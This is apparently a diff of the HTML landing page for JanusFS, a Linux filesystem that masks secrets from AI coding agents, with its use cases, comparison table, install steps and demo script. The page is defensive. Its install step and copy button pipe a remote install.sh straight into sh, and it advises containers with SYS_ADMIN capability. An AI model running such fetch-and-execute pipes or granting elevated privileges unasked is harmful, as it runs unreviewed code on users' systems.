-        <a href="https://github.com/sarathsp06/janusfs/releases">releases page</a>.
-      </p>
-    </div>
-  </section>
-
-  <!-- ===================== ARCHITECTURE ===================== -->
-  <section id="build">
-    <div class="wrap">
-      <p class="kicker">under the hood</p>
-      <h2>One daemon, one pipeline, no cgo.</h2>
-      <p class="sub">One long-lived <code style="font-family:var(--mono);color:var(--paper-2)">janusfs daemon</code> owns every mount as a struct, not a process. The core pipeline is four packages, each with one job.</p>
-
-      <div class="files">
-        <div class="file"><b>internal/rules</b><p>Discovery, parse, compile, resolve — an in-house gitignore matcher and the pattern library.</p></div>
-        <div class="file"><b>internal/engine</b><p>The atomic rule-set snapshot and generations; resolves a Decision without locks on the read path.</p></div>
-        <div class="file"><b>internal/provider</b><p><code style="font-family:var(--mono)">RedactedContentProvider</code>: a RAM cache keyed by <code style="font-family:var(--mono)">(path, mtime, size, inode, generation)</code>.</p></div>
-        <div class="file"><b>internal/redact</b><p>Length-preserving redaction and streaming modes — <code style="font-family:var(--mono)">*</code> for every masked byte, sizes untouched.</p></div>
-        <div class="file"><b>internal/mount</b><p>The FUSE adapter — thin, no business logic; translates a Decision into a kernel answer.</p></div>
-        <div class="file"><b>internal/backing</b><p>Descriptor-relative access to the source via the <code style="font-family:var(--mono)">openat</code> family with <code style="font-family:var(--mono)">O_NOFOLLOW</code>.</p></div>
+      <div style="border:1px solid #1C1F24;border-radius:11px;padding:20px;background:#0C0E11">
+        <p style="font-family:'IBM Plex Mono',monospace;font-size:12px;color:#E8B341;margin:0">03 — provider</p>
+        <p style="font-size:14px;line-height:1.55;color:#A8A49C;margin:10px 0 0">Serve redacted bytes from a RAM cache — never disk.</p>
       </div>
-      <p class="sub" style="margin-top:24px">
-        Fail closed is the tiebreak: any ambiguity resolves to the option where the agent sees <em>less</em>.
-        Redacted bytes live only in RAM; real files are never modified; nothing ever logs file content.
-      </p>
-    </div>
-  </section>
-
-  <!-- ===================== COMPARISON ===================== -->
-  <section id="compare">
-    <div class="wrap">
-      <p class="kicker">where it fits</p>
-      <h2>A complement to your sandbox, not a competitor.</h2>
-      <p class="sub">Sandboxes and containers decide allow/deny and protect the machine; JanusFS masks the bytes. Run <code style="font-family:var(--mono);color:var(--paper-2)">janusfs exec</code> inside them.</p>
-
-      <div class="files" style="margin-top:34px">
-        <div class="file"><b>why not .gitignore?</b><p>Whole-file only. A config with one secret line is all-or-nothing; JanusFS redacts the line and keeps the rest of the file readable.</p></div>
-        <div class="file"><b>why not a sandbox?</b><p>It guards the machine, not the model&#39;s context. Files it lets through still flow verbatim into the agent and its provider.</p></div>
-        <div class="file"><b>why not scrub once?</b><p>A frozen copy drifts the moment the agent edits a file. JanusFS decides per read, against the live tree, so it never goes stale.</p></div>
-      </div>
-
-      <div class="compare" style="margin-top:34px">
-        <div class="scroll">
-          <table style="min-width:640px">
-            <thead>
-              <tr>
-                <th>approach</th>
-                <th>secrets <em>inside</em> useful files?</th>
-                <th>survives iterations?</th>
-                <th>zero config-per-repo?</th>
-              </tr>
-            </thead>
-            <tbody>
-              <tr><td>.gitignore / .aiexclude</td><td class="no">whole-file only</td><td class="yes">yes</td><td class="part">per-repo</td></tr>
-              <tr><td>Harness sandbox</td><td class="no">allow or deny</td><td class="yes">yes</td><td class="yes">yes</td></tr>
-              <tr><td>Docker bind mount</td><td class="no">hands over raw file</td><td class="yes">yes</td><td class="part">image setup</td></tr>
-              <tr><td>One-shot scrubbing</td><td class="part">frozen snapshot</td><td class="no">no</td><td class="yes">yes</td></tr>
-              <tr><td>Per-tool read filters</td><td class="part">easily bypassed</td><td class="part">per-tool discipline</td><td class="part">per-tool</td></tr>
-              <tr><td>JanusFS</td><td class="yes">per-span, byte-preserving</td><td class="yes">FS boundary, per-read</td><td class="yes">machine-wide floor</td></tr>
-            </tbody>
-          </table>
-        </div>
+      <div style="border:1px solid #1C1F24;border-radius:11px;padding:20px;background:#0C0E11">
+        <p style="font-family:'IBM Plex Mono',monospace;font-size:12px;color:#E8B341;margin:0">04 — mount</p>
+        <p style="font-size:14px;line-height:1.55;color:#A8A49C;margin:10px 0 0">Translate the Decision into a kernel answer over FUSE.</p>
       </div>
     </div>
   </section>
 
-  <!-- ===================== CLOSING CTA ===================== -->
-  <section class="finale">
-    <div class="wrap">
-      <p class="kicker">stand at the doorway</p>
-      <h2>One command, and the secrets never enter.</h2>
-      <p>In Roman myth, Janus is the two-faced god of doorways. JanusFS stands between your code and any untrusted agent, deciding which face of each file is safe to show — allowed, masked, or hidden.</p>
-      <div class="cmd">
-        <span class="p">$</span>
-        <code id="cmd-finale">curl -fsSL https://raw.githubusercontent.com/sarathsp06/janusfs/main/install.sh | sh</code>
-        <button class="copy" data-copy="cmd-finale">Copy</button>
+  <section id="uses" style="max-width:1180px;margin:0 auto;padding:clamp(72px,10vw,128px) 24px 0">
+    <p style="font-family:'IBM Plex Mono',monospace;font-size:11.5px;letter-spacing:.16em;text-transform:uppercase;color:#E8B341;margin:0">use cases</p>
+    <h2 style="font-family:'Space Grotesk',sans-serif;font-weight:600;font-size:clamp(30px,4.2vw,48px);line-height:1.08;letter-spacing:-.03em;margin:16px 0 0;max-width:24ch;text-wrap:balance">Point it at a directory. Run anything against the mirror.</h2>
+    <p style="font-size:17px;line-height:1.65;color:#A8A49C;max-width:62ch;margin:20px 0 0;text-wrap:pretty">Because it's a filesystem, whatever reads files works unchanged — the agent, its shell, <code style="font-family:'IBM Plex Mono',monospace;font-size:15px;color:#DAD6CE">git</code>, the build, an MCP server. You don't wire JanusFS into your tool; you run your tool inside JanusFS.</p>
+
+    <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(min(100%,300px),1fr));gap:16px;margin-top:40px">
+      <div class="use-card" style="border:1px solid #1C1F24;border-radius:13px;padding:24px;background:#0C0E11;display:flex;flex-direction:column;gap:14px">
+        <h3 style="font-family:'Space Grotesk',sans-serif;font-size:20px;font-weight:600;letter-spacing:-.02em;margin:0;text-wrap:balance">Run a coding agent on a secret-laden repo</h3>
+        <p style="font-size:14.5px;line-height:1.6;color:#A8A49C;margin:0;flex:1">aider, Claude Code, Codex, Cursor read your source and reason about it, but .env values and API tokens read back as **** and private keys fail closed. Every child process inherits the view.</p>
+        <pre style="margin:0;padding:12px 14px;border-radius:9px;background:#07080A;border:1px solid #17191E;font-family:'IBM Plex Mono',monospace;font-size:12.5px;line-height:1.7;color:#6BCB8B;overflow-x:auto">janusfs exec -- aider</pre>
       </div>
-      <p class="note">Linux amd64 &amp; arm64 &#8212; <a href="https://github.com/sarathsp06/janusfs#quickstart">all install methods &#8594;</a> &#183; <a href="https://github.com/sarathsp06/janusfs/releases">prebuilt releases &#8594;</a></p>
+      <div class="use-card" style="border:1px solid #1C1F24;border-radius:13px;padding:24px;background:#0C0E11;display:flex;flex-direction:column;gap:14px">
+        <h3 style="font-family:'Space Grotesk',sans-serif;font-size:20px;font-weight:600;letter-spacing:-.02em;margin:0;text-wrap:balance">Cut the exfiltration path</h3>
+        <p style="font-size:14.5px;line-height:1.6;color:#A8A49C;margin:0;flex:1">Masking keeps secret bytes out of the agent; --net=none keeps whatever it did read from leaving the box — loopback only, no route out, kernel-enforced.</p>
+        <pre style="margin:0;padding:12px 14px;border-radius:9px;background:#07080A;border:1px solid #17191E;font-family:'IBM Plex Mono',monospace;font-size:12.5px;line-height:1.7;color:#6BCB8B;overflow-x:auto">janusfs exec --net=none -- claude</pre>
+      </div>
+      <div class="use-card" style="border:1px solid #1C1F24;border-radius:13px;padding:24px;background:#0C0E11;display:flex;flex-direction:column;gap:14px">
+        <h3 style="font-family:'Space Grotesk',sans-serif;font-size:20px;font-weight:600;letter-spacing:-.02em;margin:0;text-wrap:balance">A persistent masked mirror for any tool</h3>
+        <p style="font-size:14.5px;line-height:1.6;color:#A8A49C;margin:0;flex:1">Hand a long-lived mountpoint to an MCP server, a code indexer, a REPL, or a teammate's script. The daemon owns it and remounts after a reboot.</p>
+        <pre style="margin:0;padding:12px 14px;border-radius:9px;background:#07080A;border:1px solid #17191E;font-family:'IBM Plex Mono',monospace;font-size:12.5px;line-height:1.7;color:#6BCB8B;overflow-x:auto">janusfs daemon --background
+janusfs mount .
+cd "$(janusfs path .)"</pre>
+      </div>
+      <div class="use-card" style="border:1px solid #1C1F24;border-radius:13px;padding:24px;background:#0C0E11;display:flex;flex-direction:column;gap:14px">
+        <h3 style="font-family:'Space Grotesk',sans-serif;font-size:20px;font-weight:600;letter-spacing:-.02em;margin:0;text-wrap:balance">Audit before you trust it</h3>
+        <p style="font-size:14.5px;line-height:1.6;color:#A8A49C;margin:0;flex:1">See exactly what an agent would read — every likely-secret still Allowed, and why any single path resolves the way it does — before you run anything against it.</p>
+        <pre style="margin:0;padding:12px 14px;border-radius:9px;background:#07080A;border:1px solid #17191E;font-family:'IBM Plex Mono',monospace;font-size:12.5px;line-height:1.7;color:#6BCB8B;overflow-x:auto">janusfs check --secrets
+janusfs explain .env</pre>
+      </div>
+    </div>
+
+    <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(min(100%,300px),1fr));gap:16px;margin-top:16px">
+      <div style="border:1px solid #1C1F24;border-radius:13px;padding:24px;background:#0C0E11">
+        <p style="font-family:'IBM Plex Mono',monospace;font-size:11px;letter-spacing:.14em;text-transform:uppercase;color:#E8B341;margin:0">enforcement</p>
+        <h3 style="font-family:'Space Grotesk',sans-serif;font-size:19px;font-weight:600;letter-spacing:-.02em;margin:12px 0 10px">Own the process tree, not one channel</h3>
+        <p style="font-size:14.5px;line-height:1.6;color:#A8A49C;margin:0"><code style="font-family:'IBM Plex Mono',monospace;color:#DAD6CE">janusfs exec</code> confines the entire subprocess tree at once: its <code style="font-family:'IBM Plex Mono',monospace;color:#DAD6CE">read_file</code> tool, its Bash tool, <code style="font-family:'IBM Plex Mono',monospace;color:#DAD6CE">git</code>, a build, a subprocess — all inherit the filtered view, with no per-tool wiring and no way to opt out.</p>
+      </div>
+      <div style="border:1px solid #1C1F24;border-radius:13px;padding:24px;background:#0C0E11">
+        <p style="font-family:'IBM Plex Mono',monospace;font-size:11px;letter-spacing:.14em;text-transform:uppercase;color:#E8B341;margin:0">platform</p>
+        <h3 style="font-family:'Space Grotesk',sans-serif;font-size:19px;font-weight:600;letter-spacing:-.02em;margin:12px 0 10px">Non-Linux is refused, not faked</h3>
+        <p style="font-size:14.5px;line-height:1.6;color:#A8A49C;margin:0"><code style="font-family:'IBM Plex Mono',monospace;color:#DAD6CE">mount</code> and <code style="font-family:'IBM Plex Mono',monospace;color:#DAD6CE">exec</code> error out on macOS and Windows rather than pretend an advisory mount is a boundary. On a Mac, run the agent in a Linux container/VM started with <code style="font-family:'IBM Plex Mono',monospace;color:#DAD6CE">--device /dev/fuse --cap-add SYS_ADMIN</code>.</p>
+      </div>
+      <div style="border:1px solid #241C1B;border-radius:13px;padding:24px;background:#100D0D">
+        <p style="font-family:'IBM Plex Mono',monospace;font-size:11px;letter-spacing:.14em;text-transform:uppercase;color:#E2564B;margin:0">one caveat, warned loudly</p>
+        <h3 style="font-family:'Space Grotesk',sans-serif;font-size:19px;font-weight:600;letter-spacing:-.02em;margin:12px 0 10px">git stages masked bytes</h3>
+        <p style="font-size:14.5px;line-height:1.6;color:#A8A49C;margin:0">Because <code style="font-family:'IBM Plex Mono',monospace;color:#DAD6CE">.git/</code> passes through to the real object store, <code style="font-family:'IBM Plex Mono',monospace;color:#DAD6CE">git add</code> on a masked file stages the <code style="font-family:'IBM Plex Mono',monospace;color:#DAD6CE">****</code> bytes. <code style="font-family:'IBM Plex Mono',monospace;color:#DAD6CE">check</code> and <code style="font-family:'IBM Plex Mono',monospace;color:#DAD6CE">exec</code> both report every masked file git would stage.</p>
+      </div>
     </div>
   </section>
 
-  <!-- ===================== FOOTER ===================== -->
-  <footer>
-    <div class="wrap">
-      <div class="who">
-        <b>janusfs</b>
-        <p>A policy-enforcing filesystem for AI agents. Allow, deny, and the third answer — masked. MIT licensed, one static Go binary, Linux-only.</p>
+  <section id="compare" style="max-width:1180px;margin:0 auto;padding:clamp(72px,10vw,128px) 24px 0">
+    <p style="font-family:'IBM Plex Mono',monospace;font-size:11.5px;letter-spacing:.16em;text-transform:uppercase;color:#E8B341;margin:0">where it fits</p>
+    <h2 style="font-family:'Space Grotesk',sans-serif;font-weight:600;font-size:clamp(30px,4.2vw,48px);line-height:1.08;letter-spacing:-.03em;margin:16px 0 0;max-width:24ch;text-wrap:balance">A complement to your sandbox, not a competitor.</h2>
+    <p style="font-size:17px;line-height:1.65;color:#A8A49C;max-width:62ch;margin:20px 0 0;text-wrap:pretty">Sandboxes and containers decide allow/deny and protect the machine; JanusFS masks the bytes. Run <code style="font-family:'IBM Plex Mono',monospace;font-size:15px;color:#DAD6CE">janusfs exec</code> inside them.</p>
+
+    <div style="overflow-x:auto;margin-top:40px;border:1px solid #1C1F24;border-radius:13px">
+      <div style="min-width:680px">
+        <div style="display:grid;grid-template-columns:1.4fr 1.2fr 1.1fr 1.1fr;background:#101216;padding:14px 18px;font-family:'IBM Plex Mono',monospace;font-size:11px;letter-spacing:.1em;text-transform:uppercase;color:#6F6B64;gap:16px">
+          <span>approach</span><span>secrets inside useful files?</span><span>survives iterations?</span><span>zero config-per-repo?</span>
+        </div>
+        <div style="display:grid;grid-template-columns:1.4fr 1.2fr 1.1fr 1.1fr;padding:15px 18px;border-top:1px solid #15181C;gap:16px;font-size:13.5px;background:transparent">
+          <span style="font-family:'IBM Plex Mono',monospace;font-size:12.5px;color:#A8A49C">.gitignore / .aiexclude</span><span style="color:#A8A49C">whole-file only</span><span style="color:#A8A49C">yes</span><span style="color:#A8A49C">per-repo</span>
+        </div>
+        <div style="display:grid;grid-template-columns:1.4fr 1.2fr 1.1fr 1.1fr;padding:15px 18px;border-top:1px solid #15181C;gap:16px;font-size:13.5px;background:transparent">
+          <span style="font-family:'IBM Plex Mono',monospace;font-size:12.5px;color:#A8A49C">Harness sandbox</span><span style="color:#A8A49C">allow or deny</span><span style="color:#A8A49C">yes</span><span style="color:#A8A49C">yes</span>
+        </div>
+        <div style="display:grid;grid-template-columns:1.4fr 1.2fr 1.1fr 1.1fr;padding:15px 18px;border-top:1px solid #15181C;gap:16px;font-size:13.5px;background:transparent">
+          <span style="font-family:'IBM Plex Mono',monospace;font-size:12.5px;color:#A8A49C">Docker bind mount</span><span style="color:#A8A49C">hands over raw file</span><span style="color:#A8A49C">yes</span><span style="color:#A8A49C">image setup</span>
+        </div>
+        <div style="display:grid;grid-template-columns:1.4fr 1.2fr 1.1fr 1.1fr;padding:15px 18px;border-top:1px solid #15181C;gap:16px;font-size:13.5px;background:transparent">
+          <span style="font-family:'IBM Plex Mono',monospace;font-size:12.5px;color:#A8A49C">One-shot scrubbing</span><span style="color:#A8A49C">frozen snapshot</span><span style="color:#A8A49C">no</span><span style="color:#A8A49C">yes</span>
+        </div>
+        <div style="display:grid;grid-template-columns:1.4fr 1.2fr 1.1fr 1.1fr;padding:15px 18px;border-top:1px solid #15181C;gap:16px;font-size:13.5px;background:transparent">
+          <span style="font-family:'IBM Plex Mono',monospace;font-size:12.5px;color:#A8A49C">Per-tool read filters</span><span style="color:#A8A49C">easily bypassed</span><span style="color:#A8A49C">per-tool discipline</span><span style="color:#A8A49C">per-tool</span>
+        </div>
+        <div style="display:grid;grid-template-columns:1.4fr 1.2fr 1.1fr 1.1fr;padding:15px 18px;border-top:1px solid #15181C;gap:16px;font-size:13.5px;background:#14110B">
+          <span style="font-family:'IBM Plex Mono',monospace;font-size:12.5px;color:#E8B341">JanusFS</span><span style="color:#A8A49C">per-span, byte-preserving</span><span style="color:#A8A49C">FS boundary, per-read</span><span style="color:#A8A49C">machine-wide floor</span>
+        </div>
       </div>
-      <div class="col">
-        <h4>project</h4>
-        <a href="https://github.com/sarathsp06/janusfs">Source on GitHub</a>
-        <a href="https://github.com/sarathsp06/janusfs/releases">Releases</a>
-        <a href="https://github.com/sarathsp06/janusfs/blob/main/README.md">README</a>
-        <a href="https://github.com/sarathsp06/janusfs/blob/main/SPEC.md">SPEC</a>
+    </div>
+
+    <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(min(100%,260px),1fr));gap:16px;margin-top:16px">
+      <div style="border:1px solid #1C1F24;border-radius:11px;padding:20px;background:#0C0E11">
+        <p style="font-family:'IBM Plex Mono',monospace;font-size:12.5px;color:#E7E4DE;margin:0;font-weight:500">why not .gitignore?</p>
+        <p style="font-size:14px;line-height:1.55;color:#A8A49C;margin:10px 0 0">Whole-file only. A config with one secret line is all-or-nothing; JanusFS redacts the line and keeps the rest of the file readable.</p>
       </div>
-      <div class="col">
-        <h4>docs</h4>
-        <a href="https://github.com/sarathsp06/janusfs/blob/main/docs/THREAT_MODEL.md">Threat model</a>
-        <a href="https://github.com/sarathsp06/janusfs/blob/main/docs/knowledge/index.md">Knowledge bundle</a>
-        <a href="https://github.com/sarathsp06/janusfs/blob/main/docs/DEVELOPMENT.md">Development</a>
-        <a href="#top">Back to top</a>
+      <div style="border:1px solid #1C1F24;border-radius:11px;padding:20px;background:#0C0E11">
+        <p style="font-family:'IBM Plex Mono',monospace;font-size:12.5px;color:#E7E4DE;margin:0;font-weight:500">why not a sandbox?</p>
+        <p style="font-size:14px;line-height:1.55;color:#A8A49C;margin:10px 0 0">It guards the machine, not the model's context. Files it lets through still flow verbatim into the agent and its provider.</p>
+      </div>
+      <div style="border:1px solid #1C1F24;border-radius:11px;padding:20px;background:#0C0E11">
+        <p style="font-family:'IBM Plex Mono',monospace;font-size:12.5px;color:#E7E4DE;margin:0;font-weight:500">why not scrub once?</p>
+        <p style="font-size:14px;line-height:1.55;color:#A8A49C;margin:10px 0 0">A frozen copy drifts the moment the agent edits a file. JanusFS decides per read, against the live tree, so it never goes stale.</p>
+      </div>
+    </div>
+  </section>
+
+  <section id="install" style="max-width:1180px;margin:0 auto;padding:clamp(72px,10vw,128px) 24px 0">
+    <p style="font-family:'IBM Plex Mono',monospace;font-size:11.5px;letter-spacing:.16em;text-transform:uppercase;color:#E8B341;margin:0">get running</p>
+    <h2 style="font-family:'Space Grotesk',sans-serif;font-weight:600;font-size:clamp(30px,4.2vw,48px);line-height:1.08;letter-spacing:-.03em;margin:16px 0 0;max-width:24ch;text-wrap:balance">One command in, masked in a minute.</h2>
+    <p style="font-size:17px;line-height:1.65;color:#A8A49C;max-width:62ch;margin:20px 0 0;text-wrap:pretty">JanusFS runs on Linux only. Install the FUSE runtime, drop in the binary, seed a policy, then run your agent inside the boundary — or hand a persistent mount to the daemon.</p>
+
+    <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(min(100%,270px),1fr));gap:16px;margin-top:40px">
+      <div style="border:1px solid #1C1F24;border-radius:13px;padding:22px;background:#0C0E11;display:flex;flex-direction:column;gap:14px">
+        <div style="display:flex;align-items:center;gap:10px">
+          <span style="width:24px;height:24px;border-radius:7px;background:#17140D;border:1px solid #3A3220;color:#E8B341;font-family:'IBM Plex Mono',monospace;font-size:12px;display:flex;align-items:center;justify-content:center;flex:none">1</span>
+          <h3 style="font-family:'Space Grotesk',sans-serif;font-size:17px;font-weight:600;letter-spacing:-.015em;margin:0">Install the FUSE runtime</h3>
+        </div>
+        <pre style="margin:0;padding:13px 14px;border-radius:9px;background:#07080A;border:1px solid #17191E;font-family:'IBM Plex Mono',monospace;font-size:12px;line-height:1.75;color:#C9C5BD;overflow-x:auto">sudo apt-get install -y fuse3   # Debian/Ubuntu
+# sudo dnf install -y fuse3     # RHEL/Fedora</pre>
+      </div>
+      <div style="border:1px solid #1C1F24;border-radius:13px;padding:22px;background:#0C0E11;display:flex;flex-direction:column;gap:14px">
+        <div style="display:flex;align-items:center;gap:10px">
+          <span style="width:24px;height:24px;border-radius:7px;background:#17140D;border:1px solid #3A3220;color:#E8B341;font-family:'IBM Plex Mono',monospace;font-size:12px;display:flex;align-items:center;justify-content:center;flex:none">2</span>
+          <h3 style="font-family:'Space Grotesk',sans-serif;font-size:17px;font-weight:600;letter-spacing:-.015em;margin:0">Seed a policy &amp; preview</h3>
+        </div>
+        <pre style="margin:0;padding:13px 14px;border-radius:9px;background:#07080A;border:1px solid #17191E;font-family:'IBM Plex Mono',monospace;font-size:12px;line-height:1.75;color:#C9C5BD;overflow-x:auto">cd my-project
+janusfs init
+janusfs check --secrets
+janusfs explain .env</pre>
+      </div>
+      <div style="border:1px solid #1C1F24;border-radius:13px;padding:22px;background:#0C0E11;display:flex;flex-direction:column;gap:14px">
+        <div style="display:flex;align-items:center;gap:10px">
+          <span style="width:24px;height:24px;border-radius:7px;background:#17140D;border:1px solid #3A3220;color:#E8B341;font-family:'IBM Plex Mono',monospace;font-size:12px;display:flex;align-items:center;justify-content:center;flex:none">3</span>
+          <h3 style="font-family:'Space Grotesk',sans-serif;font-size:17px;font-weight:600;letter-spacing:-.015em;margin:0">Run the agent inside it</h3>
+        </div>
+        <pre style="margin:0;padding:13px 14px;border-radius:9px;background:#07080A;border:1px solid #17191E;font-family:'IBM Plex Mono',monospace;font-size:12px;line-height:1.75;color:#C9C5BD;overflow-x:auto">janusfs exec -- aider
+janusfs exec --net=none -- aider</pre>
+      </div>
+      <div style="border:1px solid #1C1F24;border-radius:13px;padding:22px;background:#0C0E11;display:flex;flex-direction:column;gap:14px">
+        <div style="display:flex;align-items:center;gap:10px">
+          <span style="width:24px;height:24px;border-radius:7px;background:#17140D;border:1px solid #3A3220;color:#E8B341;font-family:'IBM Plex Mono',monospace;font-size:12px;display:flex;align-items:center;justify-content:center;flex:none">4</span>
+          <h3 style="font-family:'Space Grotesk',sans-serif;font-size:17px;font-weight:600;letter-spacing:-.015em;margin:0">Or a persistent mount</h3>
+        </div>
+        <pre style="margin:0;padding:13px 14px;border-radius:9px;background:#07080A;border:1px solid #17191E;font-family:'IBM Plex Mono',monospace;font-size:12px;line-height:1.75;color:#C9C5BD;overflow-x:auto">janusfs daemon --background
+janusfs mount ~/proj
+cd "$(janusfs path ~/proj)"
+janusfs umount ~/proj</pre>
+      </div>
+    </div>
+
+    <p style="font-size:14.5px;line-height:1.65;color:#9A968E;max-width:70ch;margin:22px 0 0">On macOS or Windows, run all of this inside a Linux container or VM (Docker Desktop, Colima, OrbStack, a devcontainer) started with <code style="font-family:'IBM Plex Mono',monospace;color:#DAD6CE">--device /dev/fuse --cap-add SYS_ADMIN</code> — both <code style="font-family:'IBM Plex Mono',monospace;color:#DAD6CE">mount</code> and <code style="font-family:'IBM Plex Mono',monospace;color:#DAD6CE">exec</code> refuse to run natively off Linux. Prefer Go? <code style="font-family:'IBM Plex Mono',monospace;color:#DAD6CE">go install github.com/sarathsp06/janusfs/cmd/janusfs@latest</code> builds from source.</p>
+  </section>
+
+  <section style="max-width:1180px;margin:0 auto;padding:clamp(72px,10vw,128px) 24px clamp(60px,8vw,96px)">
+    <div style="border:1px solid #3A3220;border-radius:16px;background:linear-gradient(180deg,#14110B,#0C0E11);padding:clamp(36px,6vw,64px);text-align:center">
+      <p style="font-family:'IBM Plex Mono',monospace;font-size:11.5px;letter-spacing:.16em;text-transform:uppercase;color:#E8B341;margin:0">stand at the doorway</p>
+      <h2 style="font-family:'Space Grotesk',sans-serif;font-weight:600;font-size:clamp(28px,4.4vw,50px);line-height:1.06;letter-spacing:-.03em;margin:16px auto 0;max-width:20ch;text-wrap:balance">One command, and the secrets never enter.</h2>
+      <p style="font-size:16.5px;line-height:1.65;color:#A8A49C;margin:20px auto 0;max-width:58ch;text-wrap:pretty">In Roman myth, Janus is the two-faced god of doorways. JanusFS stands between your code and any untrusted agent, deciding which face of each file is safe to show — allowed, masked, or hidden.</p>
+      <div style="display:flex;align-items:center;gap:10px;background:#07080A;border:1px solid #2A2E35;border-radius:10px;padding:12px 14px;max-width:660px;margin:30px auto 0;overflow:hidden">
+        <span style="font-family:'IBM Plex Mono',monospace;color:#6BCB8B;font-size:13px">$</span>
+        <code style="font-family:'IBM Plex Mono',monospace;font-size:12.5px;color:#C9C5BD;white-space:pre-wrap;word-break:break-all;line-height:1.55;flex:1;text-align:left">curl -fsSL https://raw.githubusercontent.com/sarathsp06/janusfs/main/install.sh | sh</code>
+        <button class="copy-btn" type="button" style="flex:none;font-family:'IBM Plex Mono',monospace;font-size:11px;letter-spacing:.08em;text-transform:uppercase;padding:6px 10px;border-radius:6px;border:1px solid #2A2E35;background:transparent;color:#9A968E;cursor:pointer">copy</button>
+      </div>
+      <p style="font-family:'IBM Plex Mono',monospace;font-size:12px;color:#6F6B64;margin:14px 0 0">Linux amd64 &amp; arm64 · <a href="https://github.com/sarathsp06/janusfs#quickstart">all install methods &#8594;</a> · <a href="https://github.com/sarathsp06/janusfs/releases">prebuilt releases &#8594;</a></p>
+    </div>
+  </section>
+
+  <footer style="border-top:1px solid #15181C;background:#08090B">
+    <div style="max-width:1180px;margin:0 auto;padding:44px 24px;display:grid;grid-template-columns:repeat(auto-fit,minmax(min(100%,220px),1fr));gap:32px">
+      <div>
+        <p style="font-family:'IBM Plex Mono',monospace;font-weight:600;font-size:14px;color:#E7E4DE;margin:0;display:flex;align-items:center;gap:9px">
+          <span style="width:16px;height:16px;border-radius:50%;background:linear-gradient(90deg,#6BCB8B 0 50%,#E8B341 50% 100%);display:inline-block"></span>janusfs
+        </p>
+        <p style="font-size:13.5px;line-height:1.6;color:#6F6B64;margin:14px 0 0;max-width:38ch">A policy-enforcing filesystem for AI agents. Allow, deny, and the third answer — masked. MIT licensed, one static Go binary, Linux-only.</p>
+      </div>
+      <div>
+        <p style="font-family:'IBM Plex Mono',monospace;font-size:11px;letter-spacing:.14em;text-transform:uppercase;color:#6F6B64;margin:0">project</p>
+        <div style="display:flex;flex-direction:column;gap:9px;margin-top:14px;font-size:13.5px">
+          <a href="https://github.com/sarathsp06/janusfs">Source on GitHub</a>
+          <a href="https://github.com/sarathsp06/janusfs/releases">Releases</a>
+          <a href="https://github.com/sarathsp06/janusfs/blob/main/README.md">README</a>
+          <a href="https://github.com/sarathsp06/janusfs/blob/main/SPEC.md">SPEC</a>
+        </div>
+      </div>
+      <div>
+        <p style="font-family:'IBM Plex Mono',monospace;font-size:11px;letter-spacing:.14em;text-transform:uppercase;color:#6F6B64;margin:0">docs</p>
+        <div style="display:flex;flex-direction:column;gap:9px;margin-top:14px;font-size:13.5px">
+          <a href="https://github.com/sarathsp06/janusfs/blob/main/docs/THREAT_MODEL.md">Threat model</a>
+          <a href="https://github.com/sarathsp06/janusfs/blob/main/docs/knowledge/index.md">Knowledge bundle</a>
+          <a href="https://github.com/sarathsp06/janusfs/blob/main/docs/DEVELOPMENT.md">Development</a>
+          <a href="#top">Back to top</a>
+        </div>
       </div>
     </div>
   </footer>
+</div>
 
-  <script>
-    document.querySelectorAll('.copy').forEach(function (btn) {
-      btn.addEventListener('click', function () {
-        var el = document.getElementById(btn.dataset.copy);
-        if (!el || !navigator.clipboard) return;
-        navigator.clipboard.writeText(el.textContent.trim()).then(function () {
-          var prev = btn.textContent;
-          btn.textContent = 'Copied';
-          btn.classList.add('ok');
-          setTimeout(function () { btn.textContent = prev; btn.classList.remove('ok'); }, 1400);
-        });
-      });
+<script>
+  // Hero demo: clicking a file row swaps the `$ cat` output.
+  var demo = [
+    { path: "src/main.go",      out: "package main\n\nfunc main() { run() }",           c: "#C9C5BD" },
+    { path: ".env",             out: "API_KEY=****************************",             c: "#E8B341" },
+    { path: "config/app.yaml",  out: "db_uri: ****************************\nlog_level: debug", c: "#E8B341" },
+    { path: "id_rsa",           out: "cat: id_rsa: Permission denied",                   c: "#E2564B" },
+    { path: ".aws/credentials", out: "cat: .aws/credentials: Permission denied",         c: "#E2564B" }
+  ];
+  var rows = Array.prototype.slice.call(document.querySelectorAll(".file-row"));
+  var catPath = document.getElementById("cat-path");
+  var catOut = document.getElementById("cat-out");
+  function select(i) {
+    rows.forEach(function (r, j) { r.style.background = j === i ? "#14171B" : "transparent"; });
+    var d = demo[i];
+    catPath.textContent = "$ cat " + d.path;
+    catOut.textContent = d.out;
+    catOut.style.color = d.c;
+  }
+  rows.forEach(function (r, i) { r.addEventListener("click", function () { select(i); }); });
+  select(1);
+
+  // Copy-to-clipboard buttons.
+  var CMD = "curl -fsSL https://raw.githubusercontent.com/sarathsp06/janusfs/main/install.sh | sh";
+  Array.prototype.forEach.call(document.querySelectorAll(".copy-btn"), function (b) {
+    b.addEventListener("click", function () {
+      if (navigator.clipboard) { navigator.clipboard.writeText(CMD).catch(function () {}); }
+      var old = b.textContent;
+      b.textContent = "copied";
+      setTimeout(function () { b.textContent = old; }, 1600);
     });
-  </script>
+  });
+</script>
 </body>
 </html>
